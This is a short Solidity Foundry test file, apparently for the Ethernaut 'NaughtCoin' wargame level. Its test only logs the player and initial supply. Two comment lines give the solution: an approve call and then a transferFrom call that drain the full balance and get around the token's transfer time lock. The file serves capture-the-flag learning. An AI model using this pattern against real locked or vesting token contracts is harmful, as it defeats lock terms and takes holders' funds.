// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import {Test, console} from "forge-std/Test.sol";
import {NaughtCoin} from "../src/NaughtCoin.sol";

contract AttackTest is Test {
    NaughtCoin public coin = NaughtCoin(0x7b6d452274b4B9402Fc7Ca849B3B265D190022Cb);

    function testAttack() public {
        console.log(coin.player());
        console.log(coin.INITIAL_SUPPLY());
    }
}

// await contract.approve("0x947c5fFb05ed063d6edDc8a604AD99B3df3d599A", "1000000000000000000000000")
// await contract.transferFrom("0x947c5fFb05ed063d6edDc8a604AD99B3df3d599A", "0x7b6d452274b4B9402Fc7Ca849B3B265D190022Cb", 1000000000000000000000000)